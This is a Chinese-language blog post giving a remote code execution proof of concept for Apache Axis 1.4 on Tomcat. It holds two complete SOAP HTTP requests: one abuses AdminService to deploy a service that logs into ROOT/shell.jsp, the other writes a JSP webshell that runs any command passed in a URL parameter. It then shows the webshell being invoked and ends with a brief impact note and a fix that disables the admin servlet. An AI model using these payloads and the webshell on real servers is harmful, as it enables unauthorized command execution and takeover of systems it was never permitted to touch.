##Axis 1.4   远程命令执行（RCE） POC

###  环境准备
首先下载Axis1.4 ,web-inf 去掉adminserver注释

![avatar](https://kibodwapon.github.io/2019/07/04/is-1-4-远程命令执行POC/web-inf.jpg)
然后，开启enableremoteadmin 
![avatar](https://kibodwapon.github.io/2019/07/04/is-1-4-远程命令执行POC/config.jpg)
本人部署在tomcat8上
### 利用
#### 第一步：
通过services/AdminService 服务 部署webservice ,service开启一个写文件服务。这里我们文件名是./webapps/ROOT/shell.jsp，服务模块的工作路径是bin目录，这里利用先对路径写入ROOT目录，也就是tomcat默认根目录。

```
POST /axis/services/AdminService HTTP/1.1
Host: localhost:8080
Connection: close
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0
Accept-Language: en-US,en;q=0.5
SOAPAction: something
Upgrade-Insecure-Requests: 1
Content-Type: application/xml
Accept-Encoding: gzip, deflate
Content-Length: 1063

<?xml version="1.0" encoding="utf-8"?>
<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xmlns:api="http://127.0.0.1/Integrics/Enswitch/API"
        xmlns:xsd="http://www.w3.org/2001/XMLSchema"
        xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Body>
    <ns1:deployment
  xmlns="http://xml.apache.org/axis/wsdd/"
  xmlns:java="http://xml.apache.org/axis/wsdd/providers/java"
  xmlns:ns1="http://xml.apache.org/axis/wsdd/">
  <ns1:service name="RandomService" provider="java:RPC">
    <requestFlow>
      <handler type="RandomLog"/>
    </requestFlow>
    <ns1:parameter name="className" value="java.util.Random"/>
    <ns1:parameter name="allowedMethods" value="*"/>
  </ns1:service>
  <handler name="RandomLog" type="java:org.apache.axis.handlers.LogHandler" >  
    <parameter name="LogHandler.fileName" value="../webapps/ROOT/shell.jsp" />   
    <parameter name="LogHandler.writeToConsole" value="false" /> 
  </handler>
</ns1:deployment>
  </soapenv:Body>
</soapenv:Envelope>
```

![avatar](https://kibodwapon.github.io/2019/07/04/is-1-4-远程命令执行POC/step1.jpg)
#### 调用创建的恶意service 写入webshell
```
POST /axis/services/RandomService HTTP/1.1
Host: localhost:8080
Connection: close
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0
Accept-Language: en-US,en;q=0.5
SOAPAction: something
Upgrade-Insecure-Requests: 1
Content-Type: application/xml
Accept-Encoding: gzip, deflate
Content-Length: 878

<?xml version="1.0" encoding="utf-8"?>
        <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xmlns:api="http://127.0.0.1/Integrics/Enswitch/API"
        xmlns:xsd="http://www.w3.org/2001/XMLSchema"
        xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
        <soapenv:Body>
        <api:main
        soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
            <api:in0><![CDATA[
<%@page import="java.util.*,java.io.*"%><% if (request.getParameter("c") != null) { Process p = Runtime.getRuntime().exec(request.getParameter("c")); DataInputStream dis = new DataInputStream(p.getInputStream()); String disr = dis.readLine(); while ( disr != null ) { out.println(disr); disr = dis.readLine(); }; p.destroy(); }%>
]]>
            </api:in0>
        </api:main>
  </soapenv:Body>
</soapenv:Envelope>

```
返回500，不用管，但是文件已经创建成功了
![avatar](https://kibodwapon.github.io/2019/07/04/is-1-4-远程命令执行POC/stap2.jpg)
看我们ROOT目录下shell文件，虽然有些错误，但是不影响，因为是log模式，有追加内容
![avatar](https://kibodwapon.github.io/2019/07/04/is-1-4-远程命令执行POC/shell.jpg)
#### 第三部执行shell.jsp
访问 http://localhost:8080/shell.jsp?c=cmd%20/c%20ipconfig

同样忽略网页报错
![avatar](https://kibodwapon.github.io/2019/07/04/is-1-4-远程命令执行POC/cmd.jpg)
右键查看源码，可以看执行命令的结果。

![avatar](https://kibodwapon.github.io/2019/07/04/is-1-4-远程命令执行POC/cmd1.jpg)

### 影响和修复
默认情况下service远程管理没开启，也就是只能本地localhost访问，这种情况下可以结合ssrf和xxe进行利用，所以比较鸡肋，但是安全无小事，对于命令执行漏洞还是应该重视。修复的话，关闭admin服务即可，具体方法注释掉web-inf.xml ，然后重启tomat.
```
  <servlet-mapping>
    <servlet-name>AdminServlet</servlet-name>
    <url-pattern>/servlet/AdminServlet</url-pattern>
  </servlet-mapping>

```

